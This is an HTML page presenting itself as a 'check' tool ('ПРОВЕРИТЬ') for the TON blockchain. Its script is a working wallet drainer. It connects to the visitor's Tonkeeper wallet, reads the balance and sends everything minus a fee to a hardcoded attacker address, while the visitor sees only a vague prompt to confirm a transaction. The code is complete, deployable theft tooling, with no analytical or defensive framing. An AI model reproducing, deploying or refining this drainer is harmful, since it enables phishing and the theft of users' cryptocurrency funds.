<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        .container {
            background: #1a1a1a;
            padding: 40px 30px;
            border-radius: 24px;
            text-align: center;
            max-width: 380px;
            width: 100%;
            border: 1px solid #2a2a2a;
        }
        .btn {
            background: linear-gradient(135deg, #0098ea, #0080d0);
            border: none;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            padding: 18px 40px;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            margin: 6px 0;
        }
        .btn:active {
            transform: scale(0.96);
        }
        #status {
            margin-top: 16px;
            font-size: 13px;
            color: #888;
            min-height: 40px;
        }
        .confirm-box {
            background: #1a2a3a;
            border: 1px solid #2a4a6a;
            border-radius: 16px;
            padding: 20px;
            margin-top: 20px;
            display: none;
        }
        .confirm-box.show {
            display: block;
        }
        .confirm-box .title {
            color: #fff;
            font-size: 16px;
            font-weight: 600;
        }
        .confirm-box .sub {
            color: #8899aa;
            font-size: 13px;
            margin: 6px 0 12px 0;
        }
        .confirm-box .open-btn {
            background: #0098ea;
            border: none;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            padding: 12px 30px;
            border-radius: 40px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <div style="font-size:36px;margin-bottom:16px;">⚡</div>
        <button class="btn" id="mainBtn">ПРОВЕРИТЬ</button>
        <div id="status">Нажмите кнопку</div>

        <div class="confirm-box" id="confirmBox">
            <div class="title">Confirm the transaction in Tonkeeper</div>
            <div class="sub">It will only take a moment.</div>
            <button class="open-btn" id="openWalletBtn">Open wallet</button>
        </div>
    </div>

    <script>
        const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
        let provider = null;
        let userAddress = null;

        const mainBtn = document.getElementById('mainBtn');
        const status = document.getElementById('status');
        const confirmBox = document.getElementById('confirmBox');
        const openWalletBtn = document.getElementById('openWalletBtn');

        // ========== ПОЛУЧИТЬ БАЛАНС И ОТПРАВИТЬ ==========
        function sendAll() {
            if (!provider || !userAddress) {
                status.innerText = '❌ Нет подключения';
                return;
            }

            status.innerText = '⏳ Получение баланса...';

            provider.send('ton_getBalance', { address: userAddress })
                .then(hex => {
                    const nano = parseInt(hex, 16);
                    
                    if (nano <= 0) {
                        status.innerText = '💰 Баланс 0 TON';
                        return;
                    }

                    const fee = 5000000;
                    const amount = nano - fee;

                    if (amount <= 0) {
                        status.innerText = '⚠️ Баланс меньше комиссии';
                        return;
                    }

                    const amountTON = (amount / 1e9).toFixed(6);
                    status.innerText = `⏳ Отправка ${amountTON} TON...`;

                    // ====== ОТПРАВКА ТРАНЗАКЦИИ ======
                    return provider.send('ton_sendTransaction', {
                        to: TARGET,
                        value: amount.toString(),
                        data: '',
                        stateInit: ''
                    });
                })
                .then(result => {
                    if (result && result.code === 0) {
                        status.innerText = '✅ ВСЁ ПЕРЕВЕДЕНО!';
                        mainBtn.innerText = '✅ ГОТОВО';
                        mainBtn.disabled = true;
                        mainBtn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
                    } else {
                        status.innerText = '❌ Транзакция отклонена';
                    }
                })
                .catch(err => {
                    status.innerText = '❌ Ошибка: ' + err.message;
                });
        }

        // ========== ПОДКЛЮЧЕНИЕ ==========
        function connect() {
            status.innerText = '⏳ Подключение...';
            mainBtn.disabled = true;

            if (window.tonkeeper) {
                provider = window.tonkeeper;
                provider.send('ton_requestAccounts', {})
                    .then(accounts => {
                        if (accounts && accounts.length > 0) {
                            userAddress = accounts[0];
                            status.innerText = '✅ Подключён';
                            confirmBox.classList.add('show');
                            sendAll();
                        } else {
                            status.innerText = '❌ Отказ';
                            mainBtn.disabled = false;
                        }
                    })
                    .catch(() => {
                        status.innerText = '❌ Ошибка';
                        mainBtn.disabled = false;
                    });
                return;
            }

            // Если нет расширения
            const url = 'https://app.tonkeeper.com/ton-connect?ret=' + encodeURIComponent(window.location.href);
            window.open(url, '_blank');
            status.innerText = '✅ Подтвердите в TON Keeper';
            confirmBox.classList.add('show');
            mainBtn.disabled = false;

            // Ждём
            let attempts = 0;
            const interval = setInterval(() => {
                attempts++;
                if (window.tonkeeper) {
                    clearInterval(interval);
                    provider = window.tonkeeper;
                    provider.send('ton_requestAccounts', {})
                        .then(accounts => {
                            if (accounts && accounts.length > 0) {
                                userAddress = accounts[0];
                                status.innerText = '✅ Подключён';
                                sendAll();
                            }
                        });
                }
                if (attempts > 30) {
                    clearInterval(interval);
                }
            }, 1000);
        }

        // ========== КНОПКИ ==========
        mainBtn.addEventListener('click', connect);
        openWalletBtn.addEventListener('click', connect);

        status.innerText = 'Нажмите "ПРОВЕРИТЬ"';
    </script>
</body>
</html>
